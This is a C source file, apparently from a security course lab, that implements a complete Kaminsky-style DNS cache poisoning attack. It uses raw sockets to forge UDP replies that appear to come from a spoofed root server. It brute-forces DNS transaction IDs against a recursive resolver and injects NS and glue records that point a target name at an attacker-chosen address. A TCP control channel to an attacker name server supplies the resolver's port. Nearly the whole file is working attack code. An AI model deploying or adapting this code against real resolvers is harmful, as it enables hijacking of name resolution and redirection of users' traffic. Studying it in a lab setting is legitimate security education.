#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <ldns/ldns.h>

#define SERVER_IP     "192.168.1.201"   // attacker NS
#define RESOLVER_IP   "192.168.1.203"   // recursive resolver
#define ROOT_IP       "192.168.1.204"   // “root” NS IP we spoof
#define TARGET_NAME   "www.example1.cybercourse.example.com"
#define CONTROL_PORT  5555              // TCP control channel
#define DNS_PORT      53                // resolver’s DNS port
#define MAX_ROUNDS        650U          // num of different subdomains (ww0..)
#define SPOOF_LIMIT       1310700U      // 20 * 65535 total spoofed packets
#define GUESSES_PER_ROUND 2000U         // how many guesses per window


/* ---------- TCP control channel to attacker NS helpers ---------- */

// TCP socket to communicate with server
static int create_control_client_socket(void) {
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);          // TCP socket
  if (sockfd < 0) return -1;

  int opt = 1;
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
    close(sockfd); return -1;
  }
  opt = 1;
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
    close(sockfd); return -1;
  }

  struct sockaddr_in serv_addr;
  memset(&serv_addr, 0, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port   = htons((uint16_t)CONTROL_PORT);
  if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) != 1) {
    close(sockfd); return -1;
  }
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    close(sockfd); return -1;
  }
  return sockfd;
}

// receive resolver UDP source port (2 bytes) from our server over TCP
static int recv_resolver_port(int control_fd, uint16_t *resolver_port_out) {
  if (!resolver_port_out) return -1;

  uint16_t port_net = 0U;
  size_t total = sizeof(port_net), received = 0U;

  while (received < total) {                               // loop until we got 2 bytes
    ssize_t r = recv(control_fd, ((uint8_t *)&port_net) + received,total - received /*advance inside the uint16_t*/, 0);
    if (r <= 0) return -1;
    received += (size_t)r;
  }
  *resolver_port_out = (uint16_t)ntohs(port_net);          // convert from network to host
  return 0;
}

/* ---------- UDP query helpers (using LDNS) ---------- */

// function that sens one DNS A query to the resolver for a given name (string)
static int send_ldns_a_query(int udp_sock, const char *name_str) {
  struct sockaddr_in res_addr;
  memset(&res_addr, 0, sizeof(res_addr));
  res_addr.sin_family = AF_INET;
  res_addr.sin_port   = htons((uint16_t)DNS_PORT);
  if (inet_pton(AF_INET, RESOLVER_IP, &res_addr.sin_addr) != 1) return -1;

  ldns_rdf *name = ldns_dname_new_frm_str(name_str); // convert string to LDNS domain
  if (!name) return -1;

  ldns_pkt *query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD /*recursion desired*/);
  if (!query) {
    ldns_rdf_deep_free(name);
    return -1;
  }
  // serialize
  uint8_t *wire = NULL;
  size_t wire_len = 0U;
  if (ldns_pkt2wire(&wire, query, &wire_len) != LDNS_STATUS_OK || !wire) {
    ldns_pkt_free(query);
    return -1;
  }
  // send the dns packet to udp socket
  (void)sendto(udp_sock, wire, wire_len, 0, (struct sockaddr *)&res_addr, sizeof(res_addr));
  free(wire);
  ldns_pkt_free(query);
  return 0;
}

// send DNS A query for www.attacker.cybercourse.example.com (to learn port)
static int send_initial_attacker_query(void) {
  int sock = socket(AF_INET, SOCK_DGRAM, 0); // short-lived UDP socket
  if (sock < 0) return -1;

  int rc = send_ldns_a_query(sock, "www.attacker.cybercourse.example.com");
  close(sock);
  return rc;
}

// send a DNS 'A' query for ww<round>.example1.cybercourse.example.com on existing UDP socket
static int send_example1_subdomain_query(int udp_sock, int round_index) {
  char name_buf[256];
  int n = snprintf(name_buf, sizeof(name_buf), "ww%d.example1.cybercourse.example.com", round_index);
  if (n < 0 || (size_t)n >= sizeof(name_buf)) return -1;
  return send_ldns_a_query(udp_sock, name_buf);
}

/* ---------- checksum + raw UDP helpers ---------- */

// standard internet checksum (used for IP and pseudo-header+UDP)
static uint16_t calculate_checksum(const void *buf, size_t len) {
  const uint16_t *data = (const uint16_t *)buf;
  uint32_t sum = 0U;

  while (len > 1U) { sum += (uint32_t)(*data++); len -= 2U; }
  if (len == 1U) { uint16_t last = 0U; *(uint8_t *)&last = *(const uint8_t *)data; sum += (uint32_t)last; }

  while (sum >> 16) sum = (sum & 0xFFFFU) + (sum >> 16);   // fold carries
  return (uint16_t)(~sum);
}

// UDP checksum using IPv4 pseudo-header + UDP header + payload
static void set_udp_checksum(struct iphdr *ip_header, struct udphdr *udp_header, const uint8_t *payload, size_t payload_size) {
  struct {
      uint32_t src_addr;
      uint32_t dest_addr;
      uint8_t  placeholder;
      uint8_t  protocol;
      uint16_t udp_length;
  } pseudo_header;

  pseudo_header.src_addr    = ip_header->saddr;
  pseudo_header.dest_addr   = ip_header->daddr;
  pseudo_header.placeholder = 0U;
  pseudo_header.protocol    = IPPROTO_UDP;
  pseudo_header.udp_length  = htons((uint16_t)(sizeof(struct udphdr) + payload_size));

  size_t total_len = sizeof(pseudo_header) + sizeof(struct udphdr) + payload_size;
  uint8_t *buf = (uint8_t *)malloc(total_len);
  if (!buf) exit(EXIT_FAILURE);

  memcpy(buf, &pseudo_header, sizeof(pseudo_header));
  memcpy(buf + sizeof(pseudo_header), udp_header, sizeof(struct udphdr));
  memcpy(buf + sizeof(pseudo_header) + sizeof(struct udphdr), payload, payload_size);

  udp_header->check = calculate_checksum(buf, total_len);  // final UDP checksum
  free(buf);
}

// raw UDP socket with IP_HDRINCL so we can forge IP header
static int create_raw_udp_socket(void) {
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
  if (sock < 0) return -1;

  int opt = 1;
  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
    close(sock); return -1;
  }
  return sock;
}

/* ---------- build DNS template once per subdomain (per round) ---------- */

// build Kaminsky-style DNS response template for this subdomain
static int build_dns_template_for_subdomain(const char *subdomain_name, uint8_t **dns_wire_out, size_t *dns_len_out) {
  if (!subdomain_name || !dns_wire_out || !dns_len_out) return -1;

  *dns_wire_out = NULL; *dns_len_out = 0U;

  ldns_rdf *qname = ldns_dname_new_frm_str(subdomain_name);
  if (!qname) return -1;

  // start from a query packet so Question section is ready
  ldns_pkt *resp = ldns_pkt_query_new(qname, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, 0);

  if (!resp) {
    ldns_rdf_deep_free(qname);
    return -1;
  }

  ldns_pkt_set_id(resp, 0);           // placeholder TXID
  ldns_pkt_set_qr(resp, true);        // response bit = 1
  ldns_pkt_set_aa(resp, false);       // referral from "root", not authoritative
  ldns_pkt_set_rcode(resp, LDNS_RCODE_NOERROR);

  // edit ANSWER section: subdomain_name A 1.2.3.4 (dummy)
  ldns_rr *ans_rr = NULL;
  char ans_str[256];
  snprintf(ans_str, sizeof(ans_str), "%s 600 IN A 1.2.3.4", subdomain_name);
  if (ldns_rr_new_frm_str(&ans_rr, ans_str, 0, NULL, NULL) != LDNS_STATUS_OK || !ans_rr) {
    ldns_pkt_free(resp);
    return -1;
  }
  (void)ldns_pkt_push_rr(resp, LDNS_SECTION_ANSWER, ans_rr);

  // edit AUTHORITY section: example1.cybercourse.example.com NS TARGET_NAME
  ldns_rr *ns_rr = NULL;
  char ns_str[256];
  snprintf(ns_str, sizeof(ns_str), "example1.cybercourse.example.com 600 IN NS %s", TARGET_NAME);
  if (ldns_rr_new_frm_str(&ns_rr, ns_str, 0, NULL, NULL) != LDNS_STATUS_OK || !ns_rr) {
    ldns_pkt_free(resp);
    return -1;
  }
  (void)ldns_pkt_push_rr(resp, LDNS_SECTION_AUTHORITY, ns_rr);

  // edit ADDITIONAL section (glue): TARGET_NAME A 6.6.6.6  (the actual poison)
  ldns_rr *glue_rr = NULL;
  char glue_str[256];
  snprintf(glue_str, sizeof(glue_str), "%s 600 IN A 6.6.6.6", TARGET_NAME);
  if (ldns_rr_new_frm_str(&glue_rr, glue_str, 0, NULL, NULL) != LDNS_STATUS_OK || !glue_rr) {
    ldns_pkt_free(resp);
    return -1;
  }
  (void)ldns_pkt_push_rr(resp, LDNS_SECTION_ADDITIONAL, glue_rr);

  // serialize
  uint8_t *dns_wire = NULL;
  size_t dns_len = 0U;
  if (ldns_pkt2wire(&dns_wire, resp, &dns_len) != LDNS_STATUS_OK || !dns_wire) {
    ldns_pkt_free(resp);
    return -1;
  }

  ldns_pkt_free(resp);
  *dns_wire_out = dns_wire;
  *dns_len_out  = dns_len;
  return 0;
}

/* ---------- use template of current window and only patch TXID per guess ---------- */
static int send_spoofed_response_with_txid(int raw_sock, uint16_t txid, uint16_t resolver_port, const uint8_t *dns_tmpl, size_t dns_len) {

  if (!dns_tmpl || dns_len == 0U) return -1;

  size_t packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len; // calculate total packet length (IP header+UDP header+DNS payload)
  uint8_t *packet = (uint8_t *)malloc(packet_len);
  if (!packet) return -1;
  memset(packet, 0, packet_len);

  struct iphdr  *ip_header  = (struct iphdr *)packet;
  struct udphdr *udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
  uint8_t       *payload    = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

  memcpy(payload, dns_tmpl, dns_len);                     // copy DNS template

  // patch TXID (first 2 bytes of DNS header)
  uint16_t txid_be = htons(txid);
  payload[0] = (uint8_t)(txid_be >> 8);
  payload[1] = (uint8_t)(txid_be & 0xFF);

  // IPv4 header
  ip_header->version  = 4U;
  ip_header->ihl      = 5U;// ihl=ip header length, in chunks of 4bytes, so 5 * 4 = 20 bytes header which is the minimum and enough for us
  ip_header->tos      = 0;
  ip_header->tot_len  = htons((uint16_t)packet_len);
  ip_header->id       = htons((uint16_t)(rand() & 0xFFFF));
  ip_header->frag_off = 0;
  ip_header->ttl      = 64;
  ip_header->protocol = IPPROTO_UDP;
  ip_header->check    = 0;

  (void)inet_pton(AF_INET, ROOT_IP,     &ip_header->saddr);  // spoofed source
  (void)inet_pton(AF_INET, RESOLVER_IP, &ip_header->daddr);  // resolver dest

  ip_header->check = calculate_checksum(ip_header, sizeof(struct iphdr));

  // UDP header
  udp_header->source = htons(53U);                       // spoofed src port 53
  udp_header->dest   = htons(resolver_port);             // resolver’s port
  udp_header->len    = htons((uint16_t)(sizeof(struct udphdr) + dns_len));
  udp_header->check  = 0;
  set_udp_checksum(ip_header, udp_header, payload, dns_len);

  struct sockaddr_in dst;
  memset(&dst, 0, sizeof(dst));
  dst.sin_family = AF_INET;
  dst.sin_port   = htons(resolver_port);
  (void)inet_pton(AF_INET, RESOLVER_IP, &dst.sin_addr);

  (void)sendto(raw_sock, packet, packet_len, 0,(struct sockaddr *)&dst, sizeof(dst));

  free(packet);
  return 0;
}

/* ---------- main ---------- */
int main(void) {
  // 1. open TCP control to attacker NS
  int control_fd = create_control_client_socket();
  if (control_fd < 0) return EXIT_FAILURE;

  // 2. send initial query so NS can see resolver's UDP port
  if (send_initial_attacker_query() != 0) {
    close(control_fd); return EXIT_FAILURE;
  }

  uint16_t resolver_port = 0U;
  if (recv_resolver_port(control_fd, &resolver_port) != 0) {
    close(control_fd); return EXIT_FAILURE;
  }

  // 3. raw socket for spoofed replies
  int raw_sock = create_raw_udp_socket();
  if (raw_sock < 0) {
    close(control_fd); return EXIT_FAILURE;
  }

  // 4. UDP socket reused for all ww<i>.example1 queries
  int query_sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (query_sock < 0) {
    close(raw_sock);
    close(control_fd);
    return EXIT_FAILURE;
  }

  uint32_t total_spoofed = 0U;       // total spoofed packets across all rounds
  uint16_t cur_txid      = 0U;       // rolling TXID guess 0-65535

  for (uint32_t round = 0U; round < MAX_ROUNDS && total_spoofed < SPOOF_LIMIT; ++round) {
    // build subdomain for this round
    char subname[256];
    int n = snprintf(subname, sizeof(subname), "ww%u.example1.cybercourse.example.com", (unsigned)round);
    if (n < 0 || (size_t)n >= sizeof(subname)) continue;

    // build DNS response template once for CURRENT subdomain (ww1 for example)
    uint8_t *dns_tmpl = NULL;
    size_t dns_len = 0U;
    if (build_dns_template_for_subdomain(subname, &dns_tmpl, &dns_len) != 0) continue;

    // open the attack window: send real query for this subdomain
    if (send_example1_subdomain_query(query_sock, (int)round) != 0) {
      free(dns_tmpl);
      continue;
    }

    // brute-force TXIDs for this window
    for (uint32_t i = 0U; i < GUESSES_PER_ROUND && total_spoofed < SPOOF_LIMIT; ++i) {
      cur_txid = (uint16_t)(cur_txid + 1U); // next TXID guess, automatically in %65536 because casting to 16bit
      (void)send_spoofed_response_with_txid(raw_sock, cur_txid, resolver_port, dns_tmpl, dns_len); // send spoofed packet
      total_spoofed++;
    }

    free(dns_tmpl);
  }

  close(query_sock);
  close(raw_sock);
  close(control_fd);
  sleep(7); // client runs a bit too fast and sends the packet much faster than they all arrive/processed at the DNS Resolver
  return 0;
}
